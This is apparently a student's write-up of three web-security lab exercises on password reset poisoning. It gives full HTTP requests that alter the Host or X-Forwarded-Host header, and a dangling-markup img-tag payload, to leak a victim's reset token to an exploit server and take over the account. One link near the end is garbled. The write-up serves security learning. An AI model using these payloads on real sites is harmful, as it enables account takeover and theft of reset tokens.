
Password reset poisoning is a technique whereby an attacker manipulates a vulnerable website into generating a password reset link pointing to a domain under their control. This behavior can be leveraged to steal the secret tokens required to reset arbitrary users' passwords and, ultimately, compromise their accounts

## How does a password reset work?

Virtually all websites that require a login also implement functionality that allows users to reset their password if they forget it. There are several ways of doing this, with varying degrees of security and practicality. One of the most common approaches goes something like this:

1. The user enters their username or email address and submits a password reset request.
2. The website checks that this user exists and then generates a temporary, unique, high-entropy token, which it associates with the user's account on the back-end.
3. The website sends an email to the user that contains a link for resetting their password. The user's unique reset token is included as a query parameter in the corresponding URL:
    
    `https://normal-website.com/reset?token=0a1b2c3d4e5f6g7h8i9j`
4. When the user visits this URL, the website checks whether the provided token is valid and uses it to determine which account is being reset. If everything is as expected, the user is given the option to enter a new password. Finally, the token is destroyed.

This process is simple enough and relatively secure in comparison to some other approaches. However, its security relies on the principle that only the intended user has access to their email inbox and, therefore, to their unique token. Password reset poisoning is a method of stealing this token in order to change another user's password.

## How to construct a password reset poisoning attack

If the URL that is sent to the user is dynamically generated based on controllable input, such as the Host header, it may be possible to construct a password reset poisoning attack as follows:

1. The attacker obtains the victim's email address or username, as required, and submits a password reset request on their behalf. When submitting the form, they intercept the resulting HTTP request and modify the Host header so that it points to a domain that they control. For this example, we'll use `evil-user.net`.
2. The victim receives a genuine password reset email directly from the website. This seems to contain an ordinary link to reset their password and, crucially, contains a valid password reset token that is associated with their account. However, the domain name in the URL points to the attacker's server:
    
    `https://evil-user.net/reset?token=0a1b2c3d4e5f6g7h8i9j`
3. If the victim clicks this link (or it is fetched in some other way, for example, by an antivirus scanner) the password reset token will be delivered to the attacker's server.
4. The attacker can now visit the real URL for the vulnerable website and supply the victim's stolen token via the corresponding parameter. They will then be able to reset the user's password to whatever they like and subsequently log in to their account.

In a real attack, the attacker may seek to increase the probability of the victim clicking the link by first warming them up with a fake breach notification, for example.

Even if you can't control the password reset link, you can sometimes use the Host header to inject HTML into sensitive emails. Note that email clients typically don't execute JavaScript, but other HTML injection techniques like [dangling markup attacks](https://portswigger.net/web-security/cross-site-scripting/dangling-markup) may still apply.


## LAB 1:

**Description : **

This lab is vulnerable to password reset poisoning. The user `carlos` will carelessly click on any links in emails that he receives. To solve the lab, log in to Carlos's account.

You can log in to your own account using the following credentials: `wiener:peter`. Any emails sent to this account can be read via the email client on the exploit server.

**Solution :**

## Normal forgot-password flow (baseline)

You submit:

`POST /forgot-password Host: 0abe004f033f377381d7356400a10000.web-security-academy.net username=wiener`

What the app does internally:

1. Generates a reset token
    

- `temp-forgot-password-token=XYZ`
    
- Builds a reset link using the **Host header**
    

1. `https://0abe004f033f377381d7356400a10000.web-security-academy.net/ forgot-password?temp-forgot-password-token=XYZ`
    
2. Emails it to **wiener**
    

✔ Normal  
✔ Safe

---

## 🔹 Step 2: You change the Host header (the attack)

Now you send:

`POST /forgot-password Host: exploit-0aa300f0034637ca817034d601380094.exploit-server.net username=carlos`

⚠️ Important:

- The **request still reaches the real application**
    
- Only the **Host header value is changed**
    

---

## 🔹 Step 3: What the vulnerable app does (this is the bug)

The app **trusts the Host header** when creating the reset link.

So it builds this link:

`https://exploit-0aa300f0034637ca817034d601380094.exploit-server.net /forgot-password?temp-forgot-password-token=b5p4lv2d5lsh7nfq9j4qdk3k2hbp2pbh`

And emails it to **Carlos**.

💥 This is **password reset poisoning**.

---

## 🔹 Step 4: Why the link goes to YOUR exploit server

Because:

- The app copied the **Host header**
    
- You set it to **your exploit server**
    
- The app assumes it’s correct
    

The app doesn’t know it’s being tricked.

---

## 🔹 Step 5: Carlos clicks the link (very important)

The lab tells you:

> “Carlos will carelessly click on any links in emails he receives.”

So Carlos clicks:

`https://exploit-0aa300f0034637ca817034d601380094.exploit-server.net /forgot-password?temp-forgot-password-token=b5p4lv2d5lsh7nfq9j4qdk3k2hbp2pbh`

---

## 🔹 Step 6: How YOU get the token (your main doubt)

Your exploit server **logs all incoming requests**.

So when Carlos clicks the link:

- His browser sends a request to **your server**
    
- The token is inside the URL
    
- Your server records it
    

That’s why you see in the logs:

`GET /forgot-password?temp-forgot-password-token=b5p4lv2d5lsh7nfq9j4qdk3k2hbp2pbh User-Agent: Mozilla/5.0 (Victim)`

🎯 **That token belongs to Carlos**

---

## 🔹 Step 7: Why you see `404` (don’t worry about it)

Your exploit server does **not actually have** `/forgot-password`.

So it returns:

`404 Not Found`

But that **doesn’t matter**.

You already got what you wanted:  
✅ The token in the URL

## 🔹 Step 8: Final step — take over Carlos

Now you use the stolen token on the real site:

`https://0abe004f033f377381d7356400a10000.web-security-academy.net /forgot-password?temp-forgot-password-token=b5p4lv2d5lsh7nfq9j4qdk3k2hbp2pbh`

Set a new password → log in as **carlos** → lab solved 🎉

----

## What is `X-Forwarded-Host`? (very simple)

**`X-Forwarded-Host` is an HTTP header that says:**

> “This was the **original domain name** the user used **before** the request passed through a proxy.”

That’s it.

### Why does this header exist?

Because **modern websites don’t talk directly to users**.

Usually the flow is:

`User → Proxy → Web Application`

When a proxy forwards a request:

- The **original Host** can get lost
    
- So the proxy **adds it back** using `X-Forwarded-Host`
    

---

### Simple example

User visits:

`https://shop.example.com`

Request passes through a proxy.

Proxy forwards request like this:

`Host: internal-app-server X-Forwarded-Host: shop.example.com`

Now the app knows:  
✔ “Ah, the user actually visited `shop.example.com`

**Lab 2:**

**Description :**

This lab is vulnerable to password reset poisoning. The user `carlos` will carelessly click on any links in emails that he receives. To solve the lab, log in to Carlos's account. You can log in to your own account using the following credentials: `wiener:peter`. Any emails sent to this account can be read via the email client on the exploit server.

**Solution :**

When we click the forgot password and then with the username wiener, the request is ,

```
POST /forgot-password HTTP/2
Host: 0a4200d8040ad73281bf48e1000700de.web-security-academy.net
Cookie: session=XTrmY42DSMTMuF3by36hsyIVHnJoUCWp
Content-Length: 15
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="143", "Not A(Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Origin: https://0a4200d8040ad73281bf48e1000700de.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a4200d8040ad73281bf48e1000700de.web-security-academy.net/forgot-password
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

username=carlos
```

 and then by searching the `X-Forwarded-Host` and then change the name into carlos and then add the header at last with the `YOUR-EXPLOIT-SERVER-ID.exploit-server.net`
and the final request is ,

```
POST /forgot-password HTTP/2
Host: 0a4200d8040ad73281bf48e1000700de.web-security-academy.net
Cookie: session=XTrmY42DSMTMuF3by36hsyIVHnJoUCWp
Content-Length: 15
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="143", "Not A(Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Origin: https://0a4200d8040ad73281bf48e1000700de.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a4200d8040ad73281bf48e1000700de.web-security-academy.net/forgot-password
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
X-Forwarded-Host: exploit-0a5700050432d76c81b247b201650001.exploit-server.net

username=carlos
```

and the see the log and then visit the 

[ http s://0a4200d8040ad73281bf48e1000700de.web-security-academy.net/forgot-password?temp-forgot-password-token=2lqcaos277b71rddlewz04cysw19r12i](https://0a4200d8040ad73281bf48e1000700de.web-security-academy.net/forgot-password?temp-forgot-password-token=[https://0a4200d8040ad73281bf48e1000700de.web-security-academy.net/forgot-password?temp-forgot-password-token=2lqcaos277b71rddle wz04cysw19r12i](https://0a4200d8040ad73281bf48e1000700de.web-security-academy.net/forgot-password?temp-forgot-password-token=2lqcaos277b71rddlewz04cysw19r12i)

## What is “dangling markup”? (one-line)

> **Dangling markup** is when a web page starts an HTML tag but never properly closes it, causing the browser to **treat the rest of the page as part of that tag**.

---

## 🧠 Why this matters in Host header attacks

Some applications **insert the Host header value directly into HTML**, for example inside a `<link>` or `<a>` tag.

If the attacker controls the Host header, they can **break the HTML structure** and inject their own content.

-----

## lab 3:

**Description :**

This lab is vulnerable to password reset poisoning via dangling markup. To solve the lab, log in to Carlos's account.

You can log in to your own account using the following credentials: `wiener:peter`. Any emails sent to this account can be read via the email client on the exploit server.

**Solution **

this is the dangling markup language , the request of the forgot password is , 
```
POST /forgot-password HTTP/2
Host: 0a3100fe0493983d82a7929f0006006e.web-security-academy.net
Cookie: session=Iw0lt2rbhxuIgDzP3ixZXS81x0HuUwWg; _lab=46%7cMCwCFEsClfZ1ef0%2bS6%2fG2hnFVUvyR9HBAhRm%2fgctRRMc1qqZSF%2bH9Cd%2f%2bDAXmBwSUH%2fP2jS5bvd8c8yIH%2b%2bjAfcKam2mL6Q4k0DuSaJzih39CRqPq4agOsW%2f8yjum4fjv2H3YtzZH1m185qTeWGxqAZdPBJA9BTHQYYk9mChbwaY1KU%3d
Content-Length: 53
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="143", "Not A(Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Origin: https://0a3100fe0493983d82a7929f0006006e.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a3100fe0493983d82a7929f0006006e.web-security-academy.net/forgot-password
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

csrf=6JzqeOavpijxZYcRpkYTPooyem5Dvgzg&username=wiener
```

and this is the dangling lang , so we need to use the tag without closing the tag . 
and then by using the port it is wrking and then adding the tag ,

<img src="https://exploit-0a9300c904c4985282f491b401df0049.exploit-server.net/?


**?/** part, It is crucial to retrieve the entire email content by treating them as a query string, we ensure the successful retrieval.

the final payload is that

```
POST /forgot-password HTTP/2
Host: 0a3100fe0493983d82a7929f0006006e.web-security-academy.net:12345'><img src="https://exploit-0a9300c904c4985282f491b401df0049.exploit-server.net/?
Cookie: session=Iw0lt2rbhxuIgDzP3ixZXS81x0HuUwWg; _lab=46%7cMCwCFEsClfZ1ef0%2bS6%2fG2hnFVUvyR9HBAhRm%2fgctRRMc1qqZSF%2bH9Cd%2f%2bDAXmBwSUH%2fP2jS5bvd8c8yIH%2b%2bjAfcKam2mL6Q4k0DuSaJzih39CRqPq4agOsW%2f8yjum4fjv2H3YtzZH1m185qTeWGxqAZdPBJA9BTHQYYk9mChbwaY1KU%3d
Content-Length: 53
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="143", "Not A(Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Origin: https://0a3100fe0493983d82a7929f0006006e.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a3100fe0493983d82a7929f0006006e.web-security-academy.net/forgot-password
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

csrf=6JzqeOavpijxZYcRpkYTPooyem5Dvgzg&username=carlos
```

-------------------------------------------------------------------------------------------------------------

